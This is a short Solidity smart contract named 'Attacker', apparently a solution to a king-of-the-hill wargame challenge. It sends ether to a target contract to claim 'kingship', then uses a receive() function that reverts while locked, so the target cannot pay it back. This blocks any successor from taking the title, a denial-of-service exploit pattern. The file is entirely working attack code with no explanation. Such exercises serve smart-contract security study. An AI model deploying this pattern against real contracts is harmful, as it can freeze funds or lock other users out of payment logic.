// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/access/Ownable.sol";

pragma solidity >=0.8.2 <0.9.0;

contract Attacker is Ownable {
    address payable to;
    bool public lock = true;

    constructor(address payable _to) Ownable(msg.sender) {
        to = _to;
    }

    receive() external payable {
        require(!lock, "Locked");
    }

    function getKingship() public payable onlyOwner {
        (bool succes, ) = to.call{value: msg.value}("");
        require(succes, "Failed get Kingship");
    }

    function toggleLock() public onlyOwner {
        lock = !lock;
    }

    function withdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}